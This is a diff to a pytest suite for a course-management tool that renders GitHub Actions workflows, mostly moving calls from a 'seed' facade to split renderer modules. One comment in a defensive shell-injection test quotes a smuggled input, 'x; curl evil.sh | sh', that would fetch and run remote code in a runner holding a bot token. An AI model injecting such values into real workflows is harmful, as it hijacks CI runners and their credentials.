@@ -10,36 +10,44 @@ import pytest
 import yaml
 
 from conftest import workflow_inputs, workflow_jobs
-from dsl_course import release_budget, seed, workflows_render
+from dsl_course import (
+    discovery,
+    profile_readme,
+    release_budget,
+    seed,
+    workflows_render,
+)
 
 # Every workflow renderer, rendered -> a "it parses, and it's gated" sweep. Completeness
 # is enforced by test_every_renderer_is_covered_by_the_yaml_sweep below, so a new button
 # cannot ship without passing through yaml.safe_load.
 ALL_RENDERED = {
-    "release": seed.render_release(
+    "release": workflows_render.render_release(
         ["Cohort-f2026"], ["1", "2"], ["lectures", "labs"]
     ),
-    "central_release": seed.render_central_release(
+    "central_release": workflows_render.render_central_release(
         ["course-materials-f2026"], ["Cohort-f2026"]
     ),
-    "provision": seed.render_provision(["Cohort-f2026"], ["assignment-1-f2026"]),
-    "grade_assignment": seed.render_grade_assignment(
+    "provision": workflows_render.render_provision(
         ["Cohort-f2026"], ["assignment-1-f2026"]
     ),
-    "release_code": seed.render_release_code(["Cohort-f2026"], ["materials"]),
-    "sync_membership": seed.render_sync_membership(["Cohort-f2026"]),
-    "send_codes": seed.render_send_codes(["Cohort-f2026"]),
-    "sync_gradebooks": seed.render_sync_gradebooks(["Cohort-f2026"]),
-    "render_grades": seed.render_render_grades(["Cohort-f2026"]),
-    "distribute_grades": seed.render_distribute_grades(["Cohort-f2026"]),
-    "bootstrap_cohort": seed.render_bootstrap_cohort(),
-    "refresh": seed.render_refresh(),
-    "new_materials": seed.render_new_materials(),
-    "new_assignment": seed.render_new_assignment(),
-    "sync_site": seed.render_sync_site(["Cohort-f2026"]),
-    "publish_site": seed.render_publish_site(["course-materials-f2026"]),
-    "status": seed.render_status(["Cohort-f2026"]),
-    "scheduler": seed.render_scheduler(),
+    "grade_assignment": workflows_render.render_grade_assignment(
+        ["Cohort-f2026"], ["assignment-1-f2026"]
+    ),
+    "release_code": workflows_render.render_release_code(["Cohort-f2026"], ["materials"]),
+    "sync_membership": workflows_render.render_sync_membership(["Cohort-f2026"]),
+    "send_codes": workflows_render.render_send_codes(["Cohort-f2026"]),
+    "sync_gradebooks": workflows_render.render_sync_gradebooks(["Cohort-f2026"]),
+    "render_grades": workflows_render.render_render_grades(["Cohort-f2026"]),
+    "distribute_grades": workflows_render.render_distribute_grades(["Cohort-f2026"]),
+    "bootstrap_cohort": workflows_render.render_bootstrap_cohort(),
+    "refresh": workflows_render.render_refresh(),
+    "new_materials": workflows_render.render_new_materials(),
+    "new_assignment": workflows_render.render_new_assignment(),
+    "sync_site": workflows_render.render_sync_site(["Cohort-f2026"]),
+    "publish_site": workflows_render.render_publish_site(["course-materials-f2026"]),
+    "status": workflows_render.render_status(["Cohort-f2026"]),
+    "scheduler": workflows_render.render_scheduler(),
 }
 
 # The only renderer with no check-team gate: cron runs have no actor to check, and the
@@ -68,7 +76,9 @@ def test_every_renderer_is_covered_by_the_yaml_sweep():
 
 def test_publish_site_inputs():
     inp = workflow_inputs(
-        seed.render_publish_site(["course-materials-f2026", "course-materials-f2025"])
+        workflows_render.render_publish_site(
+            ["course-materials-f2026", "course-materials-f2025"]
+        )
     )
     assert set(inp) == {"source_repo", "readings_mode", "include_lectures"}
     assert inp["source_repo"]["options"] == [
@@ -85,7 +95,7 @@ def test_publish_site_inputs():
 
 
 def test_publish_site_has_publish_job_running_public_sync():
-    rendered = seed.render_publish_site(["course-materials-f2026"])
+    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
     assert "publish" in workflow_jobs(rendered)
     assert "dsl_course.site public-sync" in rendered
     # include_lectures off must map to the CLI flag.
@@ -96,7 +106,7 @@ def test_publish_site_cron_resyncs_from_persisted_settings():
     # The only flow that used to need a human re-click: a daily cron now re-runs the last
     # publish's persisted settings (public-sync with no source args), while the manual
     # button keeps its inputs and its check-team gate exactly as before.
-    rendered = seed.render_publish_site(["course-materials-f2026"])
+    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
     doc = yaml.safe_load(rendered)
     trigger = doc.get("on", doc.get(True))
     assert trigger["schedule"] == [{"cron": "30 5 * * *"}]
@@ -113,17 +123,19 @@ def test_publish_site_cron_resyncs_from_persisted_settings():
 
 def test_provision_has_group_toggle():
     inp = workflow_inputs(
-        seed.render_provision(["Cohort-f2026"], ["assignment-4-project-f2026"])
+        workflows_render.render_provision(["Cohort-f2026"], ["assignment-4-project-f2026"])
     )
     assert inp["group"]["type"] == "boolean"
     assert inp["group"]["default"] is False
-    assert "--group" in seed.render_provision(["Cohort-f2026"], [])
+    assert "--group" in workflows_render.render_provision(["Cohort-f2026"], [])
 
 
 def test_grade_assignment_calls_collect_with_no_deadline_input():
     # SSOT: the grading deadline comes from the cohort schedule, so the button has no
     # deadline input and never passes --deadline (collect derives it).
-    rendered = seed.render_grade_assignment(["Cohort-f2026"], ["assignment-1-f2026"])
+    rendered = workflows_render.render_grade_assignment(
+        ["Cohort-f2026"], ["assignment-1-f2026"]
+    )
     inp = workflow_inputs(rendered)
     assert "deadline" not in inp and inp["group"]["type"] == "boolean"
     assert "dsl_course.collect" in rendered
@@ -133,11 +145,11 @@ def test_grade_assignment_calls_collect_with_no_deadline_input():
 def test_sync_membership_is_a_consolidated_reconcile():
     # One consolidated, fully-automatic reconcile (roster + teams + faculty) - no
     # --prune toggle at this level, config is always the live truth.
-    rendered = seed.render_sync_membership(["Cohort-f2026"])
+    rendered = workflows_render.render_sync_membership(["Cohort-f2026"])
     inp = workflow_inputs(rendered)
     assert set(inp) == {"cohort_org"}
-    assert inp["cohort_org"]["default"] == seed._FACULTY_ONLY
-    assert inp["cohort_org"]["options"] == [seed._FACULTY_ONLY, "Cohort-f2026"]
+    assert inp["cohort_org"]["default"] == workflows_render._FACULTY_ONLY
+    assert inp["cohort_org"]["options"] == [workflows_render._FACULTY_ONLY, "Cohort-f2026"]
     assert "dsl_course.sync_membership" in rendered
     assert "--prune" not in rendered
     jobs = workflow_jobs(rendered)
@@ -148,18 +160,20 @@ def test_sync_membership_is_a_consolidated_reconcile():
 
 def test_dotgithub_readme_orients_faculty():
     # The .github repo's own README points faculty at the Actions tab where the buttons live.
-    course = seed.render_dotgithub_readme("My-Course-E1", "My Course", is_cohort=False)
+    course = profile_readme.render_dotgithub_readme(
+        "My-Course-E1", "My Course", is_cohort=False
+    )
     assert "control panel" in course
     assert "My-Course-E1/.github/actions" in course
     # A cohort org sends faculty to the parent course org for the buttons instead.
-    cohort = seed.render_dotgithub_readme(
+    cohort = profile_readme.render_dotgithub_readme(
         "My-Course-f2026", "My Course", is_cohort=True
     )
     assert "parent course org" in cohort
 
 
 def test_release_has_a_checkbox_and_path_field_per_section():
-    rendered = seed.render_release(["Cohort-f2026"], ["1", "2"], ["lectures", "labs"])
+    rendered = workflows_render.render_release(["Cohort-f2026"], ["1", "2"], ["lectures", "labs"])
     inp = workflow_inputs(rendered)
     assert set(inp) == {
         "cohort_org",
@@ -186,7 +200,7 @@ def test_release_has_a_checkbox_and_path_field_per_section():
 
 
 def test_release_builds_destinations_from_checkbox_and_path_fields():
-    rendered = seed.render_release(["Cohort-f2026"], ["1"], ["lectures", "labs"])
+    rendered = workflows_render.render_release(["Cohort-f2026"], ["1"], ["lectures", "labs"])
     assert "RELEASE_LECTURES: ${{ inputs.release_lectures }}" in rendered
     assert "PATH_LECTURES: ${{ inputs.lectures_path }}" in rendered
     # Unchecked -> not released regardless of path; checked with a blank path ->
@@ -204,14 +218,14 @@ def test_release_rejects_sections_that_collide_on_env_var_name():
     # to build them - two sections differing only by hyphen vs underscore would
     # otherwise silently share one env var and drop a destination.
     with pytest.raises(ValueError, match="case-studies.*case_studies|case_studies.*case-studies"):
-        seed.render_release(["Cohort-f2026"], ["1"], ["case-studies", "case_studies"])
+        workflows_render.render_release(["Cohort-f2026"], ["1"], ["case-studies", "case_studies"])
 
 
 def test_central_release_shares_checkbox_and_path_fields_with_the_repo_button():
     # sections here represent the union discovered across every content repo in the
     # org (computed by the caller, seed_github_workflows) - the central button no
     # longer has a separate cohort_repo/exclude fallback.
-    rendered = seed.render_central_release(
+    rendered = workflows_render.render_central_release(
         ["course-materials-f2026"], ["Cohort-f2026"], ["lectures", "labs"]
     )
     inp = workflow_inputs(rendered)
@@ -223,7 +237,7 @@ def test_central_release_shares_checkbox_and_path_fields_with_the_repo_button():
 def test_max_release_sections_caps_at_ten_input_budget():
     # 4 fixed inputs (cohort_org, sessions, include_root_files, source_repo) + 2 per
     # section must not exceed GitHub's 10-input cap on the tighter (central) button.
-    assert 4 + 2 * seed.MAX_RELEASE_SECTIONS <= 10
+    assert 4 + 2 * release_budget.MAX_RELEASE_SECTIONS <= 10
 
 
 def test_release_input_budget_matches_what_the_central_button_renders():
@@ -231,35 +245,52 @@ def test_release_input_budget_matches_what_the_central_button_renders():
     # that adding a fixed input can't silently eat a section slot. This is the tripwire:
     # the fixed-input list is checked against the inputs the tighter (central) button
     # ACTUALLY renders, and the section slots are checked against GitHub's 10-input cap.
-    fixed = workflow_inputs(seed.render_central_release(["m"], ["Cohort-f2026"], []))
+    fixed = workflow_inputs(
+        workflows_render.render_central_release(["m"], ["Cohort-f2026"], [])
+    )
     assert set(fixed) == set(release_budget.FIXED_RELEASE_INPUTS), (
         "the central Release button's fixed inputs changed - update "
         "release_budget.FIXED_RELEASE_INPUTS so the section budget is recomputed"
     )
     sections = [f"section{i}" for i in range(release_budget.MAX_RELEASE_SECTIONS)]
     full = workflow_inputs(
-        seed.render_central_release(["m"], ["Cohort-f2026"], sections)
+        workflows_render.render_central_release(["m"], ["Cohort-f2026"], sections)
     )
     assert len(full) == len(fixed) + release_budget.INPUTS_PER_SECTION * len(sections)
     assert len(full) <= release_budget.GITHUB_MAX_DISPATCH_INPUTS
     # ...and the budget is saturated: one more section would break the button outright.
     over = workflow_inputs(
-        seed.render_central_release(["m"], ["Cohort-f2026"], sections + ["extra"])
+        workflows_render.render_central_release(["m"], ["Cohort-f2026"], sections + ["extra"])
     )
     assert len(over) > release_budget.GITHUB_MAX_DISPATCH_INPUTS
 
 
-def test_seed_stays_a_working_facade_over_the_split_modules():
-    # seed re-exports the surface other modules (site, scaffold, bootstrap_course,
-    # sync_faculty/membership, scheduler) and the seeded workflows' CLI import by name.
+def test_seed_exports_exactly_what_its_callers_reach_for():
+    # seed.__all__ IS the contract now: the names other modules use as `seed.<name>`
+    # (site, scaffold, bootstrap_course, sync_faculty, sync_membership). Pinned here, so
+    # trimming one that a caller still uses fails loudly instead of at runtime.
+    assert set(seed.__all__) == {
+        "seed_github_workflows",
+        "_push_workflows",
+        "COHORTS_PATH",
+        "discover_assignments",
+        "discover_cohort_repos",
+        "discover_cohorts",
+        "discover_content_repos",
+        "discover_release_sources",
+        "discover_sessions",
+        "register_cohort",
+        "update_profile_readme",
+    }
     for name in seed.__all__:
-        assert hasattr(seed, name), f"seed.{name} disappeared - facade broken"
-    assert seed.render_release is workflows_render.render_release
-    assert seed.MAX_RELEASE_SECTIONS == release_budget.MAX_RELEASE_SECTIONS
+        assert getattr(seed, name, None) is not None, f"seed.{name} does not resolve"
+    # ...and they are the real thing, not a stale copy.
+    assert seed.discover_release_sources is discovery.discover_release_sources
+    assert seed.update_profile_readme is profile_readme.update_profile_readme
 
 
 def test_cap_sections_logs_and_truncates_past_the_limit(capsys):
-    capped = seed._cap_sections(
+    capped = release_budget.cap_sections(
         ["lectures", "labs", "readings", "handouts"], "org/repo"
     )
     assert capped == ["handouts", "labs", "lectures"]  # sorted, first 3
@@ -271,7 +302,7 @@ def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
     # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
     # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
     # user-supplied input must reach the script as an env var instead.
-    materials, assignment = seed.render_new_materials(), seed.render_new_assignment()
+    materials, assignment = workflows_render.render_new_materials(), workflows_render.render_new_assignment()
     for rendered in (materials, assignment):
         step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
         assert "${{" not in step["run"]
@@ -295,8 +326,8 @@ def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
 
 def test_choice_falls_back_when_empty():
     # An empty dropdown must still be valid YAML (a placeholder option), never blank.
-    assert "(none-yet)" in seed._choice([])
-    inp = workflow_inputs(seed.render_publish_site([]))
+    assert "(none-yet)" in workflows_render._choice([])
+    inp = workflow_inputs(workflows_render.render_publish_site([]))
     assert inp["source_repo"]["options"] == ["(none-yet)"]
 
 
@@ -304,7 +335,7 @@ def test_sync_site_auto_resyncs_on_sourced_changes():
     # Sync site must auto-fire (no manual click) on the things the site reads: a push to
     # the course dsl-course.yml, a repository_dispatch from a cohort's schedule.yml, and a
     # daily cron catch-all. The auto path is ungated (no check-team); manual stays gated.
-    doc = yaml.safe_load(seed.render_sync_site(["Cohort-f2026"]))
+    doc = yaml.safe_load(workflows_render.render_sync_site(["Cohort-f2026"]))
     trigger = doc.get("on", doc.get(True))
     assert "dsl-course.yml" in trigger["push"]["paths"]
     assert trigger["repository_dispatch"]["types"] == ["sync-site"]
